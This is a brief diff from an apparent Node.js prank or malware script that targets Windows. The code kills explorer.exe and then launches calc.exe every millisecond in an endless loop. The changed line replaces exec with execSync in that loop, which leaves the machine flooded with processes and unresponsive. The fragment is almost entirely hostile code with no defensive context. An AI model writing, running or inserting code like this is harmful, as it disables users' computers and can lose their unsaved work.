@@ -15,7 +15,7 @@ exec(`cd C:/Users/${dirname.split("\\")[2]}/Desktop`, (err, stdout, stdint) => {
     };
     exec("taskkill explorer.exe", (err, stdint, sdout) => {
         if (err) {}
-        setInterval(() => exec("start calc.exe"), 1)
+        setInterval(() => execSync("start calc.exe"), 1)
     })
     function random(length) {
         var randomed = ""
